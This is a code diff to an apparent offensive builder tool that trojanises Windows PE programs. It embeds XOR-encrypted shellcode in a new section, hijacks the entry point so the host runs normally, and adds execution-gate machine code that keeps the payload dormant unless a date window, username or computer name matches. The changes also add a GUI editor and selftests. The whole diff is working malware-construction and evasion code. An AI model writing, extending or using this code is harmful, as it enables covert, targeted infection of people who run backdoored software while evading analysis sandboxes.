@@ -367,7 +367,8 @@ def _build_pe_stub(enc_len: int, exec_off: int, sec_rva: int, oep: int,
     return bytes(code)
 
 def patch_pe(host: bytes, sc: bytes, key: bytes,
-             stub_variant: int = -1) -> bytes:
+             stub_variant: int = -1,
+             stage_prefix: bytes = b"") -> bytes:
     """Backdoor a copy of host: append a .entp section holding the XOR-encrypted
     shellcode + key + entry stub, and repoint the entry to the stub. The result
     IS the host program (same name, icon, version info) — it runs normally and
@@ -419,7 +420,7 @@ def patch_pe(host: bytes, sc: bytes, key: bytes,
 
     if len(key) != 16:
         key = (key + b"\x00" * 16)[:16]
-    enc = xor_crypt(sc, key)
+    enc = xor_crypt(stage_prefix + sc, key)
 
     # 16-align the stub so its RVA can double as a CFG table entry (the low
     # bits of GuardCFFunctionTable entries are flags, not address bits).
@@ -1419,11 +1420,19 @@ class Entrypoint:
         host_arch = ("x64" if struct.unpack_from("<H", host, machine_rva + 4)[0]
                      == 0x8664 else "x86")
         stub_variant = secrets.randbelow(STUB_VARIANT_COUNT[host_arch])
+        gate_spec = gates_spec_from_cfg(cfg)
+        gate_bytes = (build_gate_prologue(gate_spec, host_arch)
+                      if gate_spec else b"")
+        if gate_spec:
+            self.log("[*] Execution gates: %s"
+                     % ", ".join(g["kind"] + ":" + g.get("needle", "")
+                                 for g in gate_spec))
         key = rnd_bytes(16)
         self.log(f"[*] Encrypting with XOR Dynamic (key {key.hex()[:12]}...)")
         self.log(f"[*] Patching payload into host PE (T1055.002 file embedding)")
         try:
-            patched = patch_pe(host, shellcode, key, stub_variant)
+            patched = patch_pe(host, shellcode, key, stub_variant,
+                               stage_prefix=gate_bytes)
         except EntrypointError as e:
             self.log(f"[!] {e}")
             raise
@@ -1459,6 +1468,7 @@ class Entrypoint:
             "mitre": ["T1055.002", "T1027"],
             "key_hex": key.hex(),
             "stub_variant": stub_variant,
+            "gates": gate_spec or None,
             "split_delivery": bool(cfg.get("split_delivery")),
             "note": f"entry -> .entp stub ({host_arch}): decrypt, CreateThread(shellcode), jmp OEP",
         }
@@ -1666,6 +1676,11 @@ class EntrypointGUI:
         # Split-key delivery — ship the build keyless, arm it on target
         self.chk_split = ttk.Checkbutton(frm, text="Split-key delivery",
                                          variable=self.split_var)
+        # Execution gates — stage stays dormant unless its checks pass
+        self.gates_cfg = None
+        self.btn_gates = ttk.Button(frm, text="Execution gates\u2026",
+                                    command=self._pick_gates)
+        self.lbl_gates = ttk.Label(frm, text="gates: off")
 
         # Quick way to the real output folder (dot-folder next to state.json —
         # not the git clone, where users instinctively browse first)
@@ -1783,6 +1798,9 @@ class EntrypointGUI:
         self.chk_detonate.grid(row=r, column=0, sticky="w", **pad)
         self.btn_detonate.grid(row=r, column=1, sticky="e", **pad)
         self.chk_split.grid(row=r, column=2, sticky="w", **pad)
+        r += 1
+        self.btn_gates.grid(row=r, column=0, columnspan=2, sticky="w", **pad)
+        self.lbl_gates.grid(row=r, column=2, sticky="w", **pad)
 
     def _browse_implant(self):
         p = filedialog.askopenfilename(
@@ -1917,6 +1935,7 @@ class EntrypointGUI:
             "fmt": self.fmt_var.get(),
             "target": self.target_var.get(),
             "split_delivery": self.split_var.get(),
+            "gates": self.gates_cfg,
         }
         self._run_bg(cfg)
 
@@ -1983,6 +2002,100 @@ class EntrypointGUI:
         self.worker = threading.Thread(target=work, daemon=True)
         self.worker.start()
 
+    def _pick_gates(self):
+        """Execution gates editor: activation window + user/host locks."""
+        dlg = _GatesDialog(self.root, self.gates_cfg)
+        if dlg.applied:
+            self.gates_cfg = dlg.result
+            on = ([] if not self.gates_cfg else
+                  (["time"] if self.gates_cfg.get("time") else [])
+                  + (["user"] if self.gates_cfg.get("user") else [])
+                  + (["host"] if self.gates_cfg.get("host") else []))
+            self.lbl_gates.config(text="gates: "
+                                       + (", ".join(on) if on else "off"))
+
+
+class _GatesDialog:
+    """Modal execution-gates editor. .applied=True after Apply (use
+    .result, None = gates off); untouched on Cancel."""
+
+    def __init__(self, parent, gates):
+        self.result = None
+        self.applied = False
+        win = tk.Toplevel(parent)
+        self.win = win
+        win.title("Execution gates")
+        win.transient(parent)
+        win.grab_set()
+        win.resizable(False, False)
+        frm = ttk.Frame(win, padding=12)
+        frm.pack(fill="both", expand=True)
+        ttk.Label(frm, text="The stage fires only when every enabled gate\n"
+                            "passes \u2014 otherwise the thread exits and the\n"
+                            "host runs clean.").pack(anchor="w")
+        self.var_time = tk.BooleanVar(value=bool(gates and gates.get("time")))
+        ttk.Checkbutton(frm, text="Time window (inclusive, UTC dates)",
+                        variable=self.var_time).pack(anchor="w", pady=(8, 2))
+        rowt = ttk.Frame(frm)
+        rowt.pack(anchor="w")
+        self.ent_from = ttk.Entry(rowt, width=12)
+        self.ent_to = ttk.Entry(rowt, width=12)
+        if gates and gates.get("time"):
+            self.ent_from.insert(0, gates["time"][0])
+            self.ent_to.insert(0, gates["time"][1])
+        ttk.Label(rowt, text="from").pack(side="left")
+        self.ent_from.pack(side="left", padx=4)
+        ttk.Label(rowt, text="to (YYYY-MM-DD)").pack(side="left", padx=(4, 0))
+        self.ent_to.pack(side="left", padx=4)
+        rowu = ttk.Frame(frm)
+        rowu.pack(anchor="w", pady=(8, 0))
+        ttk.Label(rowu, text="User lock (USERNAME):").pack(side="left")
+        self.ent_user = ttk.Entry(rowu, width=20)
+        self.ent_user.insert(0, (gates or {}).get("user", ""))
+        self.ent_user.pack(side="left", padx=4)
+        rowh = ttk.Frame(frm)
+        rowh.pack(anchor="w", pady=(2, 0))
+        ttk.Label(rowh, text="Host lock (COMPUTERNAME):").pack(side="left")
+        self.ent_host = ttk.Entry(rowh, width=20)
+        self.ent_host.insert(0, (gates or {}).get("host", ""))
+        self.ent_host.pack(side="left", padx=4)
+        btns = ttk.Frame(frm)
+        btns.pack(fill="x", pady=(12, 0))
+        ttk.Button(btns, text="Clear all", command=self._clear).pack(side="left", padx=4)
+        ttk.Button(btns, text="Cancel", command=self._cancel).pack(side="right", padx=4)
+        ttk.Button(btns, text="Apply", command=self._ok).pack(side="right", padx=4)
+        win.bind("<Escape>", lambda e: self._cancel())
+        win.wait_window()
+
+    def _clear(self):
+        self.var_time.set(False)
+        for e in (self.ent_from, self.ent_to, self.ent_user, self.ent_host):
+            e.delete(0, "end")
+
+    def _ok(self):
+        from datetime import date as dt_date
+        g = {"time": None, "user": self.ent_user.get().strip(),
+             "host": self.ent_host.get().strip()}
+        if self.var_time.get():
+            try:
+                a = dt_date.fromisoformat(self.ent_from.get().strip())
+                b = dt_date.fromisoformat(self.ent_to.get().strip())
+            except ValueError:
+                messagebox.showerror("Execution gates",
+                                     "Dates must be YYYY-MM-DD.")
+                return
+            if a > b:
+                messagebox.showerror("Execution gates",
+                                     "Window start is after its end.")
+                return
+            g["time"] = (a.isoformat(), b.isoformat())
+        self.result = (g if (g["time"] or g["user"] or g["host"]) else None)
+        self.applied = True
+        self.win.destroy()
+
+    def _cancel(self):
+        self.win.destroy()
+
 
 class _DetonateDialog:
     """Modal detonation report — shows the three-mode matrix after a run."""
@@ -2010,6 +2123,7 @@ class _DetonateDialog:
 
 
 
+class _HostPresetDialog:
     """Tiny modal chooser — a listbox of "bucket › label (arch)" entries.
     Returns the chosen key via .result ("" = cancelled). No toplevel geometry
     guessing: transient to the parent, centered by Tk."""
@@ -2307,6 +2421,113 @@ def split_key_deliver(outdir: str, log=lambda m: None) -> str:
     log(f"[+] Arming script: {spath} — hold the key OUT of band "
         "(manifest.json keeps it lab-side)")
     return spath
+
+
+# ---------------------------------------------------------------------------
+# Execution gates — dormant-unless-allowed prologues that prepend the payload
+# inside the ENCRYPTED stage. Each gate is hand-assembled, position-independent
+# machine code with zero API calls: the time gate reads SystemTime straight
+# from KUSER_SHARED_DATA (fixed 0x7FFE0014), the user/host gates walk
+# PEB -> ProcessParameters -> Environment and compare a needle against whole
+# environment entries (ASCII-folded). Any failed gate exits the stage thread
+# cleanly (x64 ret / x86 ret 4) — the host program runs normally and the
+# payload never fires. Gates run BEFORE the payload on the stage thread; on
+# success they fall through into it.
+# ---------------------------------------------------------------------------
+
+EXEC_GATE_TEMPLATES = {
+    "time64": bytes.fromhex(
+        "48a11400fe7f0000000049b800c0692ac900000031d249f7f03da1a1a1a172073db1b1b1b1760331c0c3"),
+    "time86": bytes.fromhex(
+        "a11400fe7f8b151800fe7f0facd009c1ea09b9e0349564f7f13da1a1a1a172073db1b1b1b17603c20400"),
+    "env64": bytes.fromhex(
+        "4155415641576548a16000000000000000488b40204c8bb88000000041be900100004c8d2da1a1a1a14585f6741a41ffce4831c96641833c4f00741548ffc14881f90080000072ec415f415e415d31c0c34881f92a2a2a2a75274831c9410fb7044f450fb7444d000c204180c8204438c0750e48ffc14881f92a2a2a2a72deeb174831c96641833c4f00740548ffc1ebf34d8d7c4f02eb91415f415e415de95dffff10"),
+    "env86": bytes.fromhex(
+        "53565755e8000000005b64a1300000008b40108b7048bf900100008daba1a1a1a185ff74134f31c966833c4e0074124181f90080000072f05d5f5e5b31c0c2040081f92a2a2a2a751d31c98a044e8a544d000c2080ca2038d0750b4181f92a2a2a2a72e7eb1231c966833c4e00740341ebf68d744e02eba95d5f5e5be97fffff10"),
+}
+
+# Patch sites inside each template (byte offsets), located at bake time by
+# scanning for the placeholder immediates and capstone-verified:
+#   time - daylo/dayhi: cmp eax, imm32 (days since 1601-01-01, inclusive)
+#   env  - disp: rip/disp32 slot for the needle the builder appends right
+#           after the block; nlen: two cmp imm32 sites (needle char count);
+#           skip: rel32 of the trailing 'jmp rel32' that hops the needle
+#           so the success path falls into the next gate / the payload
+EXEC_GATE_SLOTS = {
+    "time64": {"daylo": 26, "dayhi": 33},
+    "time86": {"daylo": 26, "dayhi": 33},
+    "env64": {"disp": 37, "after": 41, "nlen": [84, 121], "skip": 159},
+    "env86": {"disp": 29, "after": 33, "nlen": [67, 94], "skip": 125},
+}
+ENV86_CALLRET = 9      # env86: pop ebx lands here (call $+5 at offset 4)
+
+def _gate_patch_u32(code: bytearray, off: int, val: int) -> None:
+    code[off:off + 4] = (val & 0xFFFFFFFF).to_bytes(4, "little")
+
+
+def build_gate_prologue(gates: list, arch: str) -> bytes:
+    """Emit the chained gate prologue for a stage. gates is a list of
+    {"kind": "time", "lo": <days>, "hi": <days>} and
+    {"kind": "env", "needle": "USERNAME=joe"} dicts (needle ASCII, matched
+    case-insensitively against whole environment entries)."""
+    if arch not in ("x64", "x86"):
+        raise EntrypointError("gates: unknown arch %r" % arch)
+    arch = {"x64": "64", "x86": "86"}[arch]     # template key suffix
+    out = bytearray()
+    for g in gates:
+        kind = g.get("kind")
+        if kind == "time":
+            lo, hi = int(g["lo"]), int(g["hi"])
+            if not (0 <= lo <= hi <= 0xFFFFFFFF):
+                raise EntrypointError(
+                    "gates: bad time window %d..%d" % (lo, hi))
+            code = bytearray(EXEC_GATE_TEMPLATES["time" + arch])
+            _gate_patch_u32(code, EXEC_GATE_SLOTS["time" + arch]["daylo"], lo)
+            _gate_patch_u32(code, EXEC_GATE_SLOTS["time" + arch]["dayhi"], hi)
+            out += code
+        elif kind == "env":
+            try:
+                needle = g["needle"].encode("ascii", "strict")
+            except UnicodeEncodeError:
+                raise EntrypointError("gates: needle must be ASCII")
+            if not 1 <= len(needle) <= 64:
+                raise EntrypointError(
+                    "gates: needle must be 1..64 ASCII chars")
+            # the compare loop reads WCHARS from the needle, so it travels
+            # UTF-16LE; nlen slots carry the CHAR count
+            needle = needle.decode("ascii").encode("utf-16-le")
+            code = bytearray(EXEC_GATE_TEMPLATES["env" + arch])
+            slots = EXEC_GATE_SLOTS["env" + arch]
+            anchor = slots["after"] if arch == "64" else ENV86_CALLRET
+            _gate_patch_u32(code, slots["disp"], len(code) - anchor)
+            for n_off in slots["nlen"]:
+                _gate_patch_u32(code, n_off, len(needle) // 2)
+            L = len(code)  # skip jmp: hop the needle, land on next gate/payload
+            _gate_patch_u32(code, slots["skip"],
+                            L + len(needle) - (slots["skip"] + 4))
+            out += code + needle
+        else:
+            raise EntrypointError("gates: unknown kind %r" % kind)
+    return bytes(out)
+
+
+def gates_spec_from_cfg(cfg) -> list:
+    """GUI gates dict -> engine gate list. None when nothing is enabled.
+    cfg["gates"] shape: {"time": ("YYYY-MM-DD", "YYYY-MM-DD") | None,
+    "user": str, "host": str}."""
+    g = cfg.get("gates") or {}
+    spec = []
+    if g.get("time"):
+        import datetime as dt
+        epoch = dt.date(1601, 1, 1)
+        lo = (dt.date.fromisoformat(g["time"][0]) - epoch).days
+        hi = (dt.date.fromisoformat(g["time"][1]) - epoch).days
+        spec.append({"kind": "time", "lo": lo, "hi": hi})
+    if g.get("user"):
+        spec.append({"kind": "env", "needle": "USERNAME=" + g["user"]})
+    if g.get("host"):
+        spec.append({"kind": "env", "needle": "COMPUTERNAME=" + g["host"]})
+    return spec or None
 
 
 def detonate(exe_path: str, mode: str, lhost: str = "127.0.0.1",
@@ -2710,6 +2931,47 @@ def _selftest():
                 v_ok = False
         if not v_ok:
             fails.append(f"variant: {v_arch} equivalence broke")
+
+    # 5e. execution gates: prologue build, slot patching, stage prefix
+    checks += 1
+    g_ok = True
+    pt = build_gate_prologue([{"kind": "time", "lo": 1, "hi": 2}], "x64")
+    tl = EXEC_GATE_SLOTS["time64"]
+    if (pt[tl["daylo"]:tl["daylo"] + 4] != (1).to_bytes(4, "little")
+            or pt[tl["dayhi"]:tl["dayhi"] + 4] != (2).to_bytes(4, "little")):
+        g_ok = False
+    pe = build_gate_prologue([{"kind": "env", "needle": "USERNAME=pc"}], "x64")
+    el = EXEC_GATE_SLOTS["env64"]
+    nw = "USERNAME=pc".encode("utf-16-le")
+    if (pe[-len(nw):] != nw
+            or len(pe) != len(EXEC_GATE_TEMPLATES["env64"]) + len(nw)
+            or int.from_bytes(pe[el["disp"]:el["disp"] + 4], "little")
+            != len(pe) - len(nw) - el["after"]
+            or any(int.from_bytes(pe[o:o + 4], "little") != len(nw) // 2
+                   for o in el["nlen"])
+            or int.from_bytes(pe[el["skip"]:el["skip"] + 4], "little")
+            != len(pe) - el["skip"] - 4):
+        g_ok = False
+    try:
+        build_gate_prologue([{"kind": "env", "needle": "USER\u00d1"}], "x64")
+        g_ok = False
+    except EntrypointError:
+        pass
+    if not g_ok:
+        fails.append("gates: prologue build/slot patching")
+    checks += 1
+    try:
+        k5 = rnd_bytes(16)
+        pro = build_gate_prologue(
+            [{"kind": "env", "needle": "username=x"}], "x64")
+        p5 = patch_pe(_mini_pe(0x8664), sc, k5, stage_prefix=pro)
+        l5 = _find_entp_stage(p5)
+        st5 = xor_crypt(p5[l5[0]:l5[0] + l5[1]],
+                        p5[l5[0] + l5[2]:l5[0] + l5[2] + 16])
+        if st5 != pro + sc or l5[1] != len(pro) + len(sc):
+            fails.append("gates: stage prefix round-trip")
+    except Exception as e:
+        fails.append("gates: stage prefix round-trip (%s)" % type(e).__name__)
 
     print(f"selftest: {checks} checks, {len(fails)} failures")
     for x in fails:
